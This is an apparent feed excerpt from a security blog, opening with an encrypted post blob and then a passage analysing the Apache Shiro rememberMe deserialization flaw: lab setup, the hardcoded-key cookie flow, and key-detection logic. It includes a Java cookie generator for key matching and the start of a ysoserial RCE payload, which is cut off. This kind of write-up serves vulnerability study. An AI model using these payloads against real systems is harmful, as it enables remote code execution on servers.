058468762df7d624579761a264d128f99aa223d2e63681e7916e3cc1526c2125ccde15b81ff6c2c7bc4bd0c4480da044963f6b308dcf8a1e5888dede64fc61f9d0ac25bcababfc2757b405dc71574b3955cacbbe8e6d7558c533a7aeffeee4377ab35daa5a000cdbcd1bf10d4ef32b99c81c0b8520ffaa68345de020adbca88810e8041d299c5a6faa3e91c09864c7b4e41f9f85b1cdb408ee9ee487d57b43c303f4b18146d08c9d681abdd6566cf89c70c46d6607de1d9802247fe23f817817748540ac0146d019a541ab778f18960d47bb3c3c459619d31f3440a4e7f493535a9e553fbf3f7e675e1d38d7b866a9460e48424f0758e3ac73f9ccbb9cc773443062d3486d21edeaf2f549478249f65c586fbfdd0e6db93afe0c52090c48a14aa8210f48a14354f071a4f4801aeb10a285488cc520280491a6a4eb5a1b023cb24d3360c6d67e6d3e9dc820b185492cdeaa0bd3eff3cf0e351a806a84b3c0f3396abb8d83892051a5a8ba4e0b73c0311629ff6e08363da1df2ead9ed6f0c87c3dccf0c461f7496b89a38f646507b35a1f4b7b124226a8801a521cee68ec2c4dd90f8bb00d88e9102e6f40a078ace58248594775d4a101ea90bb3ccbbe5bc1c38f92d9934deb0157571de5de3d363cd9afe7d7b6aa7456d69c2c9a473fb3359887c255ff6ac2653391fda5733b564831b6a880cc52e276340746e8cac22e10f24ce3258286845c866bdb4c1f22fc39ea6caf0de6411b3c955606bab171b1d41c076648595f7dff4aaf5dfde0797a30ac41aa22cc3a349613d67694c661d223754b74dc5d106ee7f6f57045383cfd083975a8641b5f3b5c5b344438203d3476c868cfe7ff85193548877bfd5ee77590a0b794f20e24ff5297ec94652410fb7f8d365bc6377d3f9bcbb109732aa26a8173217f8554e1fb34191191c18f32f715604b07f58a279fcdeaec1e025b701f31ab37f90c4e039f076d51de9f1786bb269bc2daf777fcb5dc09c1688727b77a14b7d05a5396dd74a0f363225fb83e3034bdec59d2089ce81feeaf4ab5147ec0de52947e5bc476695a9c2d6f372235b1042a47a615b7a8f913bc8fed597f2c26ac4e07a5f44e112cb69afab23606c06434176e4204dd3b394d8f88e09e04849984a7cf9d2741d6327c981427b103cd5395aa30f628811915911a0468cedc6d83ccc21a03cceb63c26904c2c928c2258d551f136c1c02850318b2c38e2309407dde638c98cc8ffe49ca391cf1536da964330473041ea10a9cfaf7dff7e0a67f9e1a26f7e39ca500f3380af4eb7531918c391af5dcb7fae0d4b88d34fb6c10ed133da53dd7eac3d193dc8cbc183dcef3d924027991708a1332bf491788c154a7c9d387cb26e1d717cd922f27151054470b02caa9a2fc9beb89a24d8ebb137a87db5c21615184a6b90a3fb6a035e846cd466149e472c900edcccf14ac16751c3467091855767ddadfdfd61c8d18fedc62cd3c45deb20704d0242988f9a403fac05782f3a72e8de1813c53f5db1eade9397aa1c9f632b007e0e56d124bb7440d72007f666aad4b06473b74ef31d433b19e051442d7aff82e92acc19128d1f5835724b7b9d5720fdadbe303204eac8e2ad48e7c37befc5f94b50257d115ee5ec1a7169d32b7db7559c28ff13c580b76c461ebff8e59be8200ff9627522efadbd572c289251bc7671107717f25b70aee4ea786e3da1e93568fa28ea6aafa4cdd5f9556877bf2c439cee530b717275ba500155a59186d8d8927c4b8f334ef9dc62c920c9c1c50e7c35a6a19cc6ae166d139dd7e3b042efacc5c55f51606c963852f0e758a22ea671cab0b29a8288e56448b48964449396d9b25eb7d60e2c678f5fd86587851804a415916151fdb6db19e93249a4e2cddf64133a37e24c72f8f27eaa8086c886832419974d19d90d54806785cf40f6979d99cc4b125db6057479fada99b74e1cc1d868e21f1c2eba8af84bdf3d55596001a4690e11834afb79fb82e32ca60044d323f983785d37fc92143682c34ae2cb27b562f032a7160c1f0f06502b7f30b62090acfaf4e2fb44466707b34f4cf35fc0474c9e87af63b01a80b63d191daca0f628ad4bed6efaa748915b47b550ffea02ecac12d51d21146b9975bad06f3e61f0148c4d7ef29e5ca4dbe0d2f6afaf90b83bd22076b210d2650aaff39ae553e964031f5eb3da28e548970a0202734b73892afb8930c24bbd7a695579321f1e7be58427d2b9946603ed0881fc6adbea37ec0a5050a3b5b6fcccc9eab8a541ef902fb6d76c40f4e378cc864edf6f9a1e689d06f191b0c13d94e70315d14ee28baccc88a1c007f29cce2febea69d4dc6602f067e097b0352cb37f680ab2a1111f993099bfdc5554d893d1f52529e778a469e8e21f35068b4d88a1936a708a1ba7f8c9369a7ce465b3a6c56fb221528b4b1f7df31ab852d286f38e2776ad5790db288fd165c17e517d4472e9eba6e12400bc5175fb3be4dbd97cc7a692e53d8e6bca4aebf2a5b1621b515f1356571147ea4ddd07b8fe53a0aac70c6bd720f418a2d368b7f8629489823efe15282c4e9066b60f2b7ab736787b476aa9e2ef1ea80299597f574d87a47e01a43e18577871ac15eb2c048e23ae8eb0dc83637981cec4ad34d24006f6293ed3211d1431084d0a5665932caf569da3d3b3418d2dd7f61567fa6c87b11317f4cf0ab0e52be84dd95e599a4a9048650e179f3b4256ef338ed4ae353dac13c0b6c21e5d06b7bab49c33fdf5ce373517f451262d3071fc9b9af63edc5e75a4772f18e3896a978ebdc38f3e58873b1733dec5c7d845d34bcf22802db1c9e9cf7ca7d19ecb78db7fc1b2d41e17e010c880f3609ead3b30e759975b8362892214354ed449302f620b930a82e0a5c1f9a99b7e749489d1c24d07fc2f9237e80bc8b4878bbc3de450c5203322645590c6a36f01b2454dbf89acdc3ff34133876255826ebed4531c57d9281607b792e6f1e12f56194043d4370172fda287d81167bfee8254aaec98d841a999c4ce67c392b1bd7c6236277ccfeaccac3c586dfec671a8146f131473ba0c0ecc78020626f047eac961d87c4a8bf3797c6fbc240680907f5589caf9d3064a188ec0a8160043af2a7d878a6b466c2443525e4ed19e273e67e8e4c6b70e70d2274d19fc374b82a8c4329d0c69aa688b94f9fa503ba4412f32d47c3239c8e7d1d88ef9982f6e9a106b9376562e891386c7d534255ac4f2e31c18e3fbb4584fb0442d377583de36f14bfe2ecfd8275bafb2d365e2cbab93937882e1857e497f1011fbe4d09ad9c727a38a000e5b89f93564a8adb8c03c698a84440d9a560b6d65cb07f3884ad92aad59f7fdf054d1905edee87fd775539ec2f9cac44c4e75192b932e239b6c154d2dd29f513ffec07b262cb7593992125ffcf766ed241104b6c9b34cd5338018b14c8383b11de710171a7eb9c987ef2aadd1ab1f8f0ab3c3fd34af0ba7d00b2983fea43a891e7aaeb62d4475d360c815b857a0134af7c9bc9ad37e3f46bab2657c37622abcf111817e4fd906b76dfdcca61137bb4451f4733efe68078b8cb8b3f06fdece7805e22ccb67dd2f206f0f03551e0d1951245163f599f65b741d9f15d745f1b17ae3a1e2e2368c325078919b9bab4d11761336de103d72d8663beebe71ed2d60f8a6a2de3f975e868b6283fd6b57efb7e1d6f58bcebc92ba8e70cda5944fcd345ba0b93d85c173b551e77612ff93722fd84ef4b38c3499b299f1d4051e0dad3a233ab301c990f4a29f93d01650648bae159b5b9d7747931274a86e9fbdead57cee7e4ddf7038bcfe371ca2fc1d83e315c26cee39db6e77097780a52b6723d69d18d6757e60f99c1a86b02b71838c798b9b4a0a5fc4f46754c30b0431620ccdfe0147280cbaad27e5d4b876363ea78871dd79cd6d9334ed33f064a0ae1f81f56abfd33c8cd61f1d241fcb0cc8d23660950732b53ebbb3aaac59f7bb986f8ec5a23c4a8ee2d355bb50fe94bdd6db0d11ab77b5867bcb8f8af4fcc964398824b7cfd720e82641b1f866fe62516790876ba3a41fcf2c885f3cdd14e313be10e3e62b9b5c10610022a8376970bab643291f4f0d53ba8635634115a8fcfaeffa3304f3d3221c64ce7fdf04c1695c23f38f53195056ee4b45dc3fc16eaf08465f9d5309b2c1667158aeb114d609223579d580b59bda3e5e0e06b22ab037215c262fdacbd3d44ee50113fb7431460b3ba6ea6a94f01fdd0253902d96654e13cadf6ec78ebf9e69fd69b3ee814f85bb2eb70feb70fd5ea83006e752ed424fc404f565f29b40d0e0853cff74f92beaed76aa8122e9b925a2dd4dba3a4626db3a56819494fb7c5aa72cf53ccb41573d44e45a4f550010d7847258bec9119ab11bc46a0a3da894875788b5d0037edca26525ba2a69a5b7c140a1e5646dd41a6f2faf1a5e4deedc961da439da39b3335f2f26292d0d2d92cd1a2762573570df0bcd6fe3adf112c00bf624aa14ca0973760babc5d4629f52035ab981e739c0ba85e473b4ad4f223472291bf4cf194037917fdd750cee66994a1a064f33455bc28546e6fc9b138f9dbf88e7335d6b12df383306e1ae8378a27b5dc58c488f2e9e3e21a87f9778909ac1a758c43db21efa823cd59ed1d8fe6651880dbb7f2f74dad37a8487a2b80d4861f6694f6a9c5f0d7122e231006ef15b59fd0d6a5fdee3e9c7794c2969f69f133134368d46fb834dbfbf61d2d52b43b13cd2664564b1043e4b003265792067488c2a6ea9c09bea60ea28d1c1e3ffef37349c67ab5da1123e878717ef98500b06c9be498503a9a93f61ef2b03e9f223b704affd3df13b2968cdae3865784e76ee9e7fbb6fcc481ccf31f3755b43dc15d72191a5e92964ceba59e71e252abad8acd27e442e7c1b2c06b8bfd98c91d1585454d06445d76b6643cfaf4552d0f5a39f4ba5ba3a14015bf1fd378087041740f33a5d49ab6867ed45c0b729af4381eb131360e292c90182f6d708b8a6879e03211b54b61ed23240fdff6c02c268e6ffd81810282f626fcb3533fe9ab7df82f4272de22e82ddf7448c37504eb2baabd1e3b8d19c51b06b1842bda78055b9e2242249c360fcd93360ba61c365a5d9a91a5c2128bb3e61dbcbd0d74524367282a90445e75c943be4bcc1f680e1699f259975976fd640d23adc0b1bca76a390fb6d3a3e2177b6e608a35f88b745ac32670d1e5f7ca625b834dd6de67c2b6a4f295aa6f0e8c6743135363cc37de1d10d774915c69d8e7484bf65b927eaf7587cb3c000156b69da5b0c297af874aa8eb19ec97b9d10fd3c846095b482f68e6296c07f8accb1479ea2f43f38a1ee5a33c47c3baaba0aa0f3b7d912f4c20e7e0147c6a1e360169204979ad61c7e92507519d0a67f091343c873cab81e54c831a4ee9436fa663c3f22fc528d6e191bf05bc21a90627ed7c8bea34b44c493a8f77b1a48b463433b8385d5473efce19af33ad59eb9c057603bc6fa6519edffb02bad3b4c2a674df80c9fe378a7879eac8a903c5e7aa98440745447c42f3f02f8040bcac74594c8d36e7580d823fc030bf764608500b2ddfc9ef48bc4a1e8727c0b396187d08ee11589421ea4d9965303918f7e7f498fdbfc48cbf28598a4be23c41eca030c61b16406e631185831e1cd9ca68ea4c1cd463e5d9a9d2e46546893617d2d07718eeaff5359bd1ad70e0164a2677d106c242c7aeeaff9203c41cef05c23e852bd44131b8e9463faffcab75f43ec333f83e6411d8c11dd2b4c02bb603975f681c64d2a218e0ceba0a0992d4285fb215a8fb0dc513ce9f8e5ed289f2c77eaa75995c7fbb311cea4f7fb4a6e08217f08965671fc3b71f4550ffaf161a5156b8d492fb5d9848cce8356113fcc26a2c36458f485f1426830546ae16d8b10b034f6c4596a5f0caadcf3e4124c090163b7c815811474c88d1e44f9fb8bdb279fb263b8ce5cdc1cb6173027e15439b96999491123148bad4a7a1a8725a984a6fe1e7439ba03290dd253f6de6f76cd1fd8efba8c56a8f7e341fcb18e1b7970ebf1719d85894aff56078ebf346301f64084aeb7a704873289185c994404f0a4be47c2f5d7d14ffe4f10797e77db025288e07f6ed3d2f29a39aa2615604f3eb20a6b059266be1a56c3fd117bc3eeb541986c8a8fd3d391954b7db0dcb54b97ccf6c59ed70e9e7cd8b87cab199dfb4714c3143109458c4011ec55992c226b932ea768bd843f7eef8da84ae340afa3d9d842add2dfa18ede322ca87f7a2816c1d8d7672e432e75dc681909d5747b9ced9a9cfb3b5717df1f40fa1ebfab7eb844b58ea505535ea8a3b21770cd80ac0d6deea698d74a6189e8828cb1c23d2f58d3b5e77f21a6f30fbe716bdfc585910bb91e2cb3a74c07dceccd8c501fb36f8f26a35f23796fdd8827a1fa1147b60ddfab0b54516699588b3795a7242875ae94f11b4efc86ef6ec8f405401005f782c4c1f4bb81d4a37e0a043f2a42c41cebed1f44273bbf252a067ae142f635ec812e30fcde0ba1d580d03f6f4eb141769d48f9f4d6f05ba3783975e354b61c64df50ff3f30f2ca8ee9c20f824752683839325b432b781c6c68a4e06f29b3b088bfc8f5cf905a463d52e0403763f0c65ebdf838df341b684ed47e3082d6596f2e02af5f7b6759addbd713c007dfa52ea603e74fabb2dba9ee4949ad819bbb69271ddf97490eb5579f6978bea0f1d4e7e8f2f149f9f903945c9dc7c597a6bfcc43205b4778fe390d8936eb056881625c3085e3f9be420bfed563fcd5c17f6e67c1276c36b132153bfaf248519ebab86ff41b8b45b324c7598a7b85416cb302f7ab05d610716e27325b69e68852a318f2aadd76fa5b83b427bcf0c7a736f73d3d04b3ab6ad68ef629698f27650076c32dd74b5ea01c6cd6dc9f046f13819abe7e4e15f44c7a7fd3f0b306026b7360a0f9bd28ed3476f3196be5817873f91e5dae74d380ff046df8eb3fb7a682fe8ef1f211f47db1fa8f10560551239605c0e9cd3a31e3469b363f0846572c07019d4c402aa2675f6aa4ba5ce11b7d915ec7ffeef948a3bb366c50b56f955389f62c223f998c9eeb4c8451143bd4b22807e42a02dc808d38167cf440fa2a644d954b24f04db7b489ab44416ee54ed45f8b60e99aa0aefcad068ddc895f3f41293f6ca3cbd8a2aa72fb1fc8b231700fb3d190c10d303e3efc1fdb523de96cd760ab50bd0a0f790ba315977b94167aa8f626ba5f545d2bdd6fd3a9dd6fb0468e3048ac730334ca2d7e490e54a8bcc737c5abd9024757080a6e2dc0ca9b14186613c90ba6dfaf1b14dcfb17ad502d425c523dc9f9d31b0e1a61f63985c27608c69f4d487f7928f3d94fe6aefb3aa22bc5ac60481b65628afce682862fbc122b5e49d67bd673aefa137b57485e5561dcdd82a6b06e195f8a3194797702e35985d93348396455aef19b1ca9d5db7fcedc5</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      🔐 内部分享
    
    </summary>
    
    
    
      <category term="深信服" scheme="https://blog.sari3l.com/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"/>
    
      <category term="Nday" scheme="https://blog.sari3l.com/tags/Nday/"/>
    
  </entry>
  
  <entry>
    <title>Shiro-055 分析&amp;回显</title>
    <link href="https://blog.sari3l.com/posts/55ea3bd4/"/>
    <id>https://blog.sari3l.com/posts/55ea3bd4/</id>
    <published>2020-08-23T05:06:09.000Z</published>
    <updated>2020-08-23T05:10:03.779Z</updated>
    
    <content type="html"><![CDATA[<h2 id="I-准备"><a href="#I-准备" class="headerlink" title="I. 准备"></a>I. 准备</h2><p>使用 docker hub 已有的漏洞环境，IDEA 配置 Remote Debug</p><pre class=" language-shell"><code class="language-shell">> docker pull medicean/vulapps:s_shiro_1> docker run -d -p 8080:8080 -p 8090:8090 --env JAVA_OPTS="-Xdebug -Xrunjdwp:transport=dt_socket,address=8090,server=y,suspend=n" medicean/vulapps:s_shiro_1</code></pre><p>拉取源码</p><pre class=" language-shell"><code class="language-shell">> git clone https://github.com/apache/shiro.git> git checkout shiro-root-1.2.4</code></pre><h2 id="II-漏洞原理"><a href="#II-漏洞原理" class="headerlink" title="II. 漏洞原理"></a>II. 漏洞原理</h2><p>原因是因为在 org.apache.shiro.mgt.AbstractRememberMeManager 中有定义以下内容，导致攻击者利用默认密码实现反序列化RCE</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15975905440609.jpg" alt="-w588"></p><ol><li><p>序列化对象需要继承 PrincipalCollection (实际非必须，下文有解释)</p></li><li><p>设置加密方式为 AES/CBC/PKCS5Padding，具体可在org.apache.shiro.crypto.DefaultBlockCipherService#DefaultBlockCipherService中查看</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15978155103697.jpg" alt="-w696"></p></li><li><p>硬编码默认加密密钥 DEFAULT_CIPHER_KEY_BYTES</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15975752216803.jpg" alt="-w888"></p></li></ol><h3 id="加密cookie"><a href="#加密cookie" class="headerlink" title="加密cookie"></a>加密cookie</h3><p>当用户登陆成功并且选择rememberme的时候，会进入org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin 保存新的验证信息</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15975913577431.jpg" alt="-w843"></p><p>接着在rememberIdentity函数中，先通过getIdentityToRemember获取到用户标志信息</p><blockquote><p>Returns all principals associated with the corresponding Subject. Each principal is an identifying piece of information useful to the application such as a username, or user id, a given name, etc - anything useful to the application to identify the current Subject.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15975918939762.jpg" alt="-w844"></p><p>再进入同名方法rememberIdentity中，这里首先通过convertPrincipalsToBytes将用户信息转换成 byte 数组，后进行保存</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15975921483867.jpg" alt="-w744"></p><p>我们来看convertPrincipalsToBytes，先进行序列化后再进行加密，我们重点关注加密算法</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15975917689368.jpg" alt="-w680"></p><p>在 org.apache.shiro.mgt.AbstractRememberMeManager#encrypt 中调用 AES 类进行加密</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15978076688353.jpg" alt="-w755"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15978156691340.jpg" alt="-w423"></p><p>实际是调用<code>org.apache.shiro.crypto.JcaCipherService#encrypt(byte[], byte[])</code>和<code>encrypt(byte[], byte[], byte[], boolean)</code>，可以看到在最后是把 iv 放在 crypt 加密后的数据内容前，再整体返回</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15978160744231.jpg" alt="-w914"></p><p>最后进入org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity，对信息 base64编码后存放入 cookie</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15978164894987.jpg" alt="-w917"></p><h3 id="解密cookie"><a href="#解密cookie" class="headerlink" title="解密cookie"></a>解密cookie</h3><p>当用户携带 rememberMe cookie 进行访问时，会进入org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15978175616743.jpg" alt="-w698"></p><p>调用子类CookieRememberMeManager#getRememberedSerializedIdentity提取 cookie，首先判断非 deleteMe 且进行 base64 尾部检测填充后，返回有效 cookie 回到 AbstractRememberMeManager</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15978177704065.jpg" alt="-w902"></p><p>之后在org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals中，尝试解密和反序列化</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15978178067478.jpg" alt="-w817"></p><p>解密位于org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15978178548281.jpg" alt="-w772"></p><p>最后由org.apache.shiro.crypto.JcaCipherService#decrypt(byte[], byte[])和decrypt(byte[], byte[], byte[])实现解密，整个流程都很常规，主要关注是从 cookie 头16位字节数据为 iv</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15978180179924.jpg" alt="-w914"></p><h2 id="III-漏洞检测"><a href="#III-漏洞检测" class="headerlink" title="III. 漏洞检测"></a>III. 漏洞检测</h2><h3 id="1-无效rememberMe"><a href="#1-无效rememberMe" class="headerlink" title="1. 无效rememberMe"></a>1. 无效rememberMe</h3><p>只能快速判断是否使用 shiro</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>当我们输入一个无效的 rememberMe cookie 时会因无法解密或反序列化触发异常进入org.apache.shiro.mgt.AbstractRememberMeManager#onRememberedPrincipalFailure</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15978187385340.jpg" alt="-w1177"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15978188176420.jpg" alt="-w923"></p><p>之后进入org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(org.apache.shiro.subject.SubjectContext)</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15978188494866.jpg" alt="-w687"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15978188780907.jpg" alt="-w641"></p><p>最后调用org.apache.shiro.web.servlet.SimpleCookie#removeFrom方法添加 cookie <code>rememberMe=deleteMe</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15978189943674.jpg" alt="-w910"></p><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15978190869603.jpg" alt="-w830"></p><h3 id="2-反序列化"><a href="#2-反序列化" class="headerlink" title="2. 反序列化"></a>2. 反序列化</h3><p>主要利用正常解密后的反序列化利用，但反序列化的前提是要使用正确的 key 实现正常解密</p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>从上面<strong>无效 rememberMe</strong>一节中我们还可以知道</p><ul><li>当 key 匹配且正常反序列化时，响应不会返回 rememberMe=delete</li><li>当 key 不匹配时，响应返回 rememberMe=delete</li></ul><p><strong>那么只要保证序列化对象的有效性，就可以通过上面的差异来实现匹配 Key</strong></p><p>因为序列化对象需要继承PrincipalCollection，所以我们主要关注SimplePrincipalMap、SimplePrincipalCollection</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15978203984295.jpg" alt="-w850"></p><p>简单写个脚本用于生成 payload</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>codec<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>AesCipherService<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>io<span class="token punctuation">.</span>DefaultSerializer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>subject<span class="token punctuation">.</span>PrincipalCollection<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>subject<span class="token punctuation">.</span>SimplePrincipalMap<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ByteSource<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">generate</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Serializer<span class="token operator">&lt;</span>PrincipalCollection<span class="token operator">></span> serializer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultSerializer</span><span class="token operator">&lt;</span>PrincipalCollection<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        SimplePrincipalMap simplePrincipalMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimplePrincipalMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token string">"&lt;INPUT KEY HERE>"</span><span class="token punctuation">,</span> serializer<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>simplePrincipalMap<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> String <span class="token function">encrypt</span><span class="token punctuation">(</span>String key<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> objectBytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> keyDecode <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        AesCipherService cipherService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AesCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ByteSource byteSource <span class="token operator">=</span> cipherService<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>objectBytes<span class="token punctuation">,</span> keyDecode<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> byteSource<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="效果-1"><a href="#效果-1" class="headerlink" title="效果"></a>效果</h4><table><thead><tr><th>Key 匹配</th><th>Key 不匹配</th></tr></thead><tbody><tr><td><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15978226467789.jpg" alt="-w828"></td><td><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15978228045356.jpg" alt="-w829"></td></tr></tbody></table><h3 id="3-HTTPLog-or-DNSLog"><a href="#3-HTTPLog-or-DNSLog" class="headerlink" title="3. HTTPLog or DNSLog"></a>3. HTTPLog or DNSLog</h3><p>实际也是利用反序列化，只是简单的向外请求解析域名，但是很多人都喜欢用这个，所以单独列出来</p><p>XXXLog 平台如果提供有 API 就可以自动化检测，但毕竟此方法受太多客观因素影响，不建议</p><h2 id="IV-漏洞利用"><a href="#IV-漏洞利用" class="headerlink" title="IV. 漏洞利用"></a>IV. 漏洞利用</h2><p>我们刚才提到了，序列化对象需要继承PrincipalCollection，那么这是必要的么？如果能没有这层限制，是否能利用其他 gadget 进而实现 RCE</p><p>我们关注到org.apache.shiro.mgt.AbstractRememberMeManager#deserialize，这里最后调用的是org.apache.shiro.io.DefaultSerializer#deserialize进行反序列化，只是在 return 时会强制转化为PrincipalCollection类型对象</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15978236110127.jpg" alt="-w601"></p><p>所以我们可以使用其他 gadget 执行攻击，例如 ysoserial 系列</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>codec<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>AesCipherService<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>io<span class="token punctuation">.</span>DefaultSerializer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ByteSource<span class="token punctuation">;</span><span class="token keyword">import</span> ysoserial<span class="token punctuation">.</span>payloads<span class="token punctuation">.</span>CommonsCollections2<span class="token 